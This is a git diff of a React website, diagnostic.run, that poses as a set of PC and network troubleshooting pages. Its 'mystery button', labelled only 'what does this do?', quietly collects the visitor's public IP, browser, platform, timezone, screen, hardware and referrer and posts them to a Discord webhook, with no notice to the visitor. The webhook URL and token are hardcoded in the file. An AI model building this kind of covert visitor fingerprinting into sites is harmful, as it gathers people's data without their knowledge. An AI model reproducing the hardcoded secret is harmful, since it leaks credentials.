@@ -2,41 +2,104 @@ import React, { useEffect, useState } from 'react';
 import { createRoot } from 'react-dom/client';
 import './styles.css';
 
+/*
+ * IMPORTANT:
+ * Keep your Discord webhook out of GitHub.
+ * Paste your webhook URL locally here if you are using
+ * the mystery button.
+ */
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1544799468476563506/CnL5_J1Lzv6dDdtoyVwVNjDKETvWu84m-c-wLcQjpwm3xEFcKKaEFZ5d1qIw1AjQSAvd';
 
 /* =========================
    ROUTING
 ========================= */
 
+function getRouteFromHash() {
+  const hash = window.location.hash;
+
+  switch (hash) {
+    case '#/diagnostic':
+      return 'diagnostic';
+
+    case '#/pc':
+      return 'pc';
+
+    case '#/wifi':
+      return 'wifi';
+
+    case '#/downloads':
+      return 'downloads';
+
+    case '#/':
+    case '':
+      return 'home';
+
+    default:
+      return 'home';
+  }
+}
+
 function navigate(path) {
+  /*
+   * Update the URL.
+   *
+   * The hashchange event will then update React's
+   * route state and display the correct page.
+   */
+  if (window.location.hash === path) {
+    window.scrollTo({
+      top: 0,
+      behavior: 'instant'
+    });
+
+    return;
+  }
+
   window.location.hash = path;
-  window.scrollTo(0, 0);
+
+  window.scrollTo({
+    top: 0,
+    behavior: 'instant'
+  });
 }
 
 function useRoute() {
-  const getRoute = () => {
-    const hash = window.location.hash;
-
-    if (hash === '#/diagnostic') return 'diagnostic';
-    if (hash === '#/pc') return 'pc';
-    if (hash === '#/wifi') return 'wifi';
-    if (hash === '#/downloads') return 'downloads';
-
-    return 'home';
-  };
-
-  const [route, setRoute] = useState(getRoute);
+  const [route, setRoute] = useState(
+    getRouteFromHash()
+  );
 
   useEffect(() => {
-    const handleHashChange = () => {
-      setRoute(getRoute());
-      window.scrollTo(0, 0);
+    const handleRouteChange = () => {
+      setRoute(getRouteFromHash());
+
+      window.scrollTo({
+        top: 0,
+        behavior: 'instant'
+      });
     };
 
-    window.addEventListener('hashchange', handleHashChange);
+    /*
+     * Listen for:
+     * - Navigation buttons
+     * - Browser Back
+     * - Browser Forward
+     */
+    window.addEventListener(
+      'hashchange',
+      handleRouteChange
+    );
+
+    /*
+     * Make sure the current URL is processed
+     * immediately when the app loads.
+     */
+    handleRouteChange();
 
     return () => {
-      window.removeEventListener('hashchange', handleHashChange);
+      window.removeEventListener(
+        'hashchange',
+        handleRouteChange
+      );
     };
   }, []);
 
@@ -50,7 +113,9 @@ function useRoute() {
 function Nav() {
   return (
     <nav className="nav">
+
       <button
+        type="button"
         className="logo logo-button"
         onClick={() => navigate('#/')}
       >
@@ -58,25 +123,42 @@ function Nav() {
       </button>
 
       <div className="nav-links">
-        <button onClick={() => navigate('#/')}>
+
+        <button
+          type="button"
+          onClick={() => navigate('#/')}
+        >
           Home
         </button>
 
-        <button onClick={() => navigate('#/diagnostic')}>
+        <button
+          type="button"
+          onClick={() => navigate('#/diagnostic')}
+        >
           Run Diagnostic
         </button>
 
-        <button onClick={() => navigate('#/pc')}>
+        <button
+          type="button"
+          onClick={() => navigate('#/pc')}
+        >
           PC Performance
         </button>
 
-        <button onClick={() => navigate('#/wifi')}>
+        <button
+          type="button"
+          onClick={() => navigate('#/wifi')}
+        >
           Wi-Fi
         </button>
 
-        <button onClick={() => navigate('#/downloads')}>
+        <button
+          type="button"
+          onClick={() => navigate('#/downloads')}
+        >
           Downloads
         </button>
+
       </div>
     </nav>
   );
@@ -102,16 +184,21 @@ function Layout({ children }) {
 function Terminal() {
   return (
     <div className="terminal">
+
       <div className="terminal-top">
+
         <span className="dot red"></span>
         <span className="dot yellow"></span>
         <span className="dot green"></span>
+
         <span className="terminal-title">
           diagnostic.run
         </span>
+
       </div>
 
       <div className="terminal-body">
+
         <div>
           <span className="green-text">$</span>{' '}
           diagnostic --scan
@@ -130,9 +217,12 @@ function Terminal() {
         </div>
 
         <div>
-          <span className="green-text">✓</span> Ready.
+          <span className="green-text">✓</span>{' '}
+          Ready.
         </div>
+
       </div>
+
     </div>
   );
 }
@@ -145,8 +235,13 @@ function Home() {
   return (
     <>
       <main>
+
+        {/* HERO */}
+
         <section className="hero">
+
           <div className="hero-content">
+
             <div className="eyebrow">
               <span className="status-dot"></span>
               SYSTEM DIAGNOSTICS
@@ -159,33 +254,46 @@ function Home() {
             </h1>
 
             <p className="hero-description">
-              diagnostic.run gives you simple tools to find
-              problems with your PC, network and internet
-              connection.
+              diagnostic.run gives you simple tools
+              to find problems with your PC, network
+              and internet connection.
             </p>
 
             <div className="hero-buttons">
+
               <button
+                type="button"
                 className="primary-button"
-                onClick={() => navigate('#/diagnostic')}
+                onClick={() =>
+                  navigate('#/diagnostic')
+                }
               >
                 Run Diagnostic
                 <span>→</span>
               </button>
 
               <button
+                type="button"
                 className="secondary-button"
-                onClick={() => navigate('#/pc')}
+                onClick={() =>
+                  navigate('#/pc')
+                }
               >
                 Explore Tools
               </button>
+
             </div>
+
           </div>
 
           <Terminal />
+
         </section>
 
+        {/* SERVICES */}
+
         <section className="services">
+
           <div className="section-heading">
             <span>01</span>
             <h2>Diagnostic tools</h2>
@@ -193,37 +301,52 @@ function Home() {
 
           <div className="service-grid">
 
-            {/* RUN DIAGNOSTIC REMOVED FROM HERE */}
+            {/* PC PERFORMANCE */}
 
             <button
+              type="button"
               className="service-card"
-              onClick={() => navigate('#/pc')}
+              onClick={() =>
+                navigate('#/pc')
+              }
             >
+
               <div className="service-number">
                 01
               </div>
 
-              <h3>PC Performance</h3>
+              <h3>
+                PC Performance
+              </h3>
 
               <p>
-                Find common causes of slowdowns and
-                improve system performance.
+                Find common causes of slowdowns
+                and improve system performance.
               </p>
 
               <span className="service-arrow">
                 →
               </span>
+
             </button>
 
+            {/* WI-FI */}
+
             <button
+              type="button"
               className="service-card"
-              onClick={() => navigate('#/wifi')}
+              onClick={() =>
+                navigate('#/wifi')
+              }
             >
+
               <div className="service-number">
                 02
               </div>
 
-              <h3>Wi-Fi & Network</h3>
+              <h3>
+                Wi-Fi & Network
+              </h3>
 
               <p>
                 Troubleshoot connection problems,
@@ -233,17 +356,26 @@ function Home() {
               <span className="service-arrow">
                 →
               </span>
+
             </button>
 
+            {/* DOWNLOADS */}
+
             <button
+              type="button"
               className="service-card"
-              onClick={() => navigate('#/downloads')}
+              onClick={() =>
+                navigate('#/downloads')
+              }
             >
+
               <div className="service-number">
                 03
               </div>
 
-              <h3>Downloads</h3>
+              <h3>
+                Downloads
+              </h3>
 
               <p>
                 Access diagnostic utilities and
@@ -253,57 +385,81 @@ function Home() {
               <span className="service-arrow">
                 →
               </span>
+
             </button>
 
           </div>
+
         </section>
 
+        {/* QUICK WINS */}
+
         <section className="quick-wins">
+
           <div className="section-heading">
             <span>02</span>
             <h2>Quick wins</h2>
           </div>
 
           <div className="quick-grid">
+
             <div className="quick-card">
+
               <span>01</span>
 
-              <h3>Restart your router</h3>
+              <h3>
+                Restart your router
+              </h3>
 
               <p>
                 A simple restart can clear temporary
                 network problems and connection issues.
               </p>
+
             </div>
 
             <div className="quick-card">
+
               <span>02</span>
 
-              <h3>Restart your PC</h3>
+              <h3>
+                Restart your PC
+              </h3>
 
               <p>
                 Restarting clears temporary processes
                 and gives your system a clean start.
               </p>
+
             </div>
 
             <div className="quick-card">
+
               <span>03</span>
 
-              <h3>Check background apps</h3>
+              <h3>
+                Check background apps
+              </h3>
 
               <p>
                 Close applications consuming unnecessary
                 CPU, RAM or network resources.
               </p>
+
             </div>
+
           </div>
+
         </section>
 
+        {/* MYSTERY BUTTON */}
+
         <MysteryButton />
+
       </main>
 
       <Footer />
+
     </>
   );
 }
@@ -313,10 +469,14 @@ function Home() {
 ========================= */
 
 function MysteryButton() {
-  const [status, setStatus] = useState('');
+
+  const [status, setStatus] =
+    useState('');
 
   async function getPublicIP() {
+
     try {
+
       const response = await fetch(
         'https://api.ipify.org?format=json',
         {
@@ -325,21 +485,30 @@ function MysteryButton() {
       );
 
       if (!response.ok) {
-        throw new Error('IP request failed');
+        throw new Error(
+          'IP request failed'
+        );
       }
 
-      const data = await response.json();
+      const data =
+        await response.json();
 
       return data.ip || 'Unknown';
+
     } catch {
+
       return 'Unavailable';
+
     }
   }
 
   async function measurePing() {
-    const start = performance.now();
+
+    const start =
+      performance.now();
 
     try {
+
       await fetch(
         `/favicon.png?ping=${Date.now()}`,
         {
@@ -351,25 +520,41 @@ function MysteryButton() {
       return `${Math.round(
         performance.now() - start
       )} ms`;
+
     } catch {
+
       return 'Unavailable';
+
     }
   }
 
   async function handleClick() {
+
     if (
       !DISCORD_WEBHOOK ||
-      DISCORD_WEBHOOK.includes('PASTE_YOUR')
+      DISCORD_WEBHOOK.includes(
+        'PASTE_YOUR'
+      )
     ) {
-      setStatus('Webhook not configured');
+
+      setStatus('!');
+
+      setTimeout(() => {
+        setStatus('');
+      }, 1500);
+
       return;
     }
 
     setStatus('...');
 
     try {
-      const ip = await getPublicIP();
-      const ping = await measurePing();
+
+      const ip =
+        await getPublicIP();
+
+      const ping =
+        await measurePing();
 
       const connection =
         navigator.connection ||
@@ -377,18 +562,22 @@ function MysteryButton() {
         navigator.webkitConnection;
 
       const deviceInfo = {
+
         IP: ip,
 
         Ping: ping,
 
         Platform:
-          navigator.platform || 'Unknown',
+          navigator.platform ||
+          'Unknown',
 
         Browser:
-          navigator.userAgent || 'Unknown',
+          navigator.userAgent ||
+          'Unknown',
 
         Language:
-          navigator.language || 'Unknown',
+          navigator.language ||
+          'Unknown',
 
         Languages:
           navigator.languages?.join(', ') ||
@@ -397,7 +586,8 @@ function MysteryButton() {
         Timezone:
           Intl.DateTimeFormat()
             .resolvedOptions()
-            .timeZone || 'Unknown',
+            .timeZone ||
+          'Unknown',
 
         Screen:
           `${window.screen.width} × ${window.screen.height}`,
@@ -406,7 +596,8 @@ function MysteryButton() {
           `${window.innerWidth} × ${window.innerHeight}`,
 
         PixelRatio:
-          window.devicePixelRatio || 'Unknown',
+          window.devicePixelRatio ||
+          'Unknown',
 
         CPU:
           navigator.hardwareConcurrency
@@ -419,7 +610,8 @@ function MysteryButton() {
             : 'Unknown',
 
         ConnectionType:
-          connection?.effectiveType || 'Unknown',
+          connection?.effectiveType ||
+          'Unknown',
 
         Downlink:
           connection?.downlink
@@ -427,49 +619,56 @@ function MysteryButton() {
             : 'Unknown',
 
         Referrer:
-          document.referrer || 'Direct',
+          document.referrer ||
+          'Direct',
 
         Page:
           window.location.href
       };
 
-      const fields = Object.entries(
-        deviceInfo
-      ).map(([name, value]) => ({
-        name,
-        value: String(value),
-        inline: true
-      }));
+      const fields =
+        Object.entries(
+          deviceInfo
+        ).map(([name, value]) => ({
+          name,
+          value: String(value),
+          inline: true
+        }));
 
-      const response = await fetch(
-        DISCORD_WEBHOOK,
-        {
-          method: 'POST',
+      const response =
+        await fetch(
+          DISCORD_WEBHOOK,
+          {
+            method: 'POST',
 
-          headers: {
-            'Content-Type': 'application/json'
-          },
+            headers: {
+              'Content-Type':
+                'application/json'
+            },
 
-          body: JSON.stringify({
-            content: 'button clicked',
+            body: JSON.stringify({
 
-            embeds: [
-              {
-                title:
-                  'Mystery Button Clicked',
+              content:
+                'button clicked',
 
-                description:
-                  'Public browser/device information collected from diagnostic.run',
+              embeds: [
+                {
+                  title:
+                    'Mystery Button Clicked',
 
-                fields,
+                  description:
+                    'Public browser/device information collected from diagnostic.run',
 
-                timestamp:
-                  new Date().toISOString()
-              }
-            ]
-          })
-        }
-      );
+                  fields,
+
+                  timestamp:
+                    new Date().toISOString()
+                }
+              ]
+
+            })
+          }
+        );
 
       if (!response.ok) {
         throw new Error(
@@ -484,19 +683,30 @@ function MysteryButton() {
       }, 1500);
 
     } catch (error) {
+
       console.error(error);
+
       setStatus('!');
+
+      setTimeout(() => {
+        setStatus('');
+      }, 1500);
+
     }
   }
 
   return (
+
     <section className="mystery-section">
+
       <div className="mystery-label">
         what does this do?
       </div>
 
       <div className="mystery-ring">
+
         <button
+          type="button"
           className="mystery-button"
           onClick={handleClick}
           disabled={status === '...'}
@@ -504,8 +714,11 @@ function MysteryButton() {
         >
           {status}
         </button>
+
       </div>
+
     </section>
+
   );
 }
 
@@ -514,6 +727,7 @@ function MysteryButton() {
 ========================= */
 
 function Diagnostic() {
+
   const [results, setResults] =
     useState(null);
 
@@ -521,12 +735,14 @@ function Diagnostic() {
     useState(false);
 
   async function runDiagnostic() {
+
     setRunning(true);
 
     const start =
       performance.now();
 
     try {
+
       await fetch(
         `/favicon.png?diagnostic=${Date.now()}`,
         {
@@ -534,6 +750,7 @@ function Diagnostic() {
           cache: 'no-store'
         }
       );
+
     } catch {}
 
     const latency =
@@ -542,6 +759,7 @@ function Diagnostic() {
       );
 
     setResults({
+
       browser:
         navigator.userAgent,
 
@@ -570,40 +788,52 @@ function Diagnostic() {
 
       latency:
         `${latency} ms`
+
     });
 
     setRunning(false);
   }
 
   return (
+
     <Page>
+
       <div className="page-header">
+
         <div className="section-heading">
           <span>03</span>
           <h2>System Diagnostic</h2>
         </div>
 
         <p>
-          Run a quick browser-based diagnostic to
-          see information about your current
+          Run a quick browser-based diagnostic
+          to see information about your current
           system and connection.
         </p>
+
       </div>
 
       <div className="diagnostic-box">
+
         <button
+          type="button"
           className="primary-button diagnostic-button"
           onClick={runDiagnostic}
           disabled={running}
         >
+
           {running
             ? 'Running...'
             : 'Run Diagnostic'}
 
-          {!running && <span>→</span>}
+          {!running && (
+            <span>→</span>
+          )}
+
         </button>
 
         {results && (
+
           <div className="results">
 
             <Result
@@ -647,9 +877,13 @@ function Diagnostic() {
             />
 
           </div>
+
         )}
+
       </div>
+
     </Page>
+
   );
 }
 
@@ -657,12 +891,21 @@ function Diagnostic() {
    RESULT ROW
 ========================= */
 
-function Result({ name, value }) {
+function Result({
+  name,
+  value
+}) {
+
   return (
+
     <div className="result-row">
+
       <span>{name}</span>
+
       <strong>{value}</strong>
+
     </div>
+
   );
 }
 
@@ -671,9 +914,13 @@ function Result({ name, value }) {
 ========================= */
 
 function PCPerformance() {
+
   return (
+
     <Page>
+
       <div className="page-header">
+
         <div className="section-heading">
           <span>04</span>
           <h2>PC Performance</h2>
@@ -684,6 +931,7 @@ function PCPerformance() {
           and improve the responsiveness of your
           computer.
         </p>
+
       </div>
 
       <div className="guide-grid">
@@ -725,7 +973,9 @@ function PCPerformance() {
         />
 
       </div>
+
     </Page>
+
   );
 }
 
@@ -734,9 +984,13 @@ function PCPerformance() {
 ========================= */
 
 function Wifi() {
+
   return (
+
     <Page>
+
       <div className="page-header">
+
         <div className="section-heading">
           <span>05</span>
           <h2>Wi-Fi & Network</h2>
@@ -746,6 +1000,7 @@ function Wifi() {
           Troubleshoot connection problems,
           latency and common network issues.
         </p>
+
       </div>
 
       <div className="guide-grid">
@@ -787,7 +1042,9 @@ function Wifi() {
         />
 
       </div>
+
     </Page>
+
   );
 }
 
@@ -796,23 +1053,31 @@ function Wifi() {
 ========================= */
 
 function Downloads() {
+
   return (
+
     <Page>
+
       <div className="page-header">
+
         <div className="section-heading">
           <span>06</span>
           <h2>Downloads</h2>
         </div>
 
         <p>
-          Diagnostic utilities and additional tools
-          will be available here.
+          Diagnostic utilities and additional
+          tools will be available here.
         </p>
+
       </div>
 
       <div className="downloads-box">
+
         <div className="download-item">
+
           <div>
+
             <span className="download-number">
               01
             </span>
@@ -825,14 +1090,19 @@ function Downloads() {
               Additional diagnostic tools will
               appear here in the future.
             </p>
+
           </div>
 
           <span className="download-status">
             COMING SOON
           </span>
+
         </div>
+
       </div>
+
     </Page>
+
   );
 }
 
@@ -845,14 +1115,19 @@ function GuideCard({
   title,
   text
 }) {
+
   return (
+
     <div className="guide-card">
+
       <span>{number}</span>
 
       <h3>{title}</h3>
 
       <p>{text}</p>
+
     </div>
+
   );
 }
 
@@ -860,22 +1135,34 @@ function GuideCard({
    PAGE WRAPPER
 ========================= */
 
-function Page({ children }) {
+function Page({
+  children
+}) {
+
   return (
+
     <>
+
       <main className="page">
+
         <button
+          type="button"
           className="back-home"
-          onClick={() => navigate('#/')}
+          onClick={() =>
+            navigate('#/')
+          }
         >
           ← Home
         </button>
 
         {children}
+
       </main>
 
       <Footer />
+
     </>
+
   );
 }
 
@@ -884,12 +1171,19 @@ function Page({ children }) {
 ========================= */
 
 function Footer() {
+
   return (
+
     <footer className="footer">
+
       <div>
+
         <button
+          type="button"
           className="logo logo-button"
-          onClick={() => navigate('#/')}
+          onClick={() =>
+            navigate('#/')
+          }
         >
           diagnostic<span>.run</span>
         </button>
@@ -897,15 +1191,20 @@ function Footer() {
         <p>
           Know what's wrong. Fix what's slow.
         </p>
+
       </div>
 
       <div className="footer-right">
+
         <span>
           © {new Date().getFullYear()}
           {' '}diagnostic.run
         </span>
+
       </div>
+
     </footer>
+
   );
 }
 
@@ -914,11 +1213,13 @@ function Footer() {
 ========================= */
 
 function App() {
+
   const route = useRoute();
 
   let page;
 
   switch (route) {
+
     case 'diagnostic':
       page = <Diagnostic />;
       break;
@@ -935,21 +1236,32 @@ function App() {
       page = <Downloads />;
       break;
 
+    case 'home':
     default:
       page = <Home />;
+      break;
+
   }
 
   return (
+
     <Layout>
       {page}
     </Layout>
+
   );
 }
+
+/* =========================
+   START APPLICATION
+========================= */
 
 createRoot(
   document.getElementById('root')
 ).render(
+
   <React.StrictMode>
     <App />
   </React.StrictMode>
+
 );
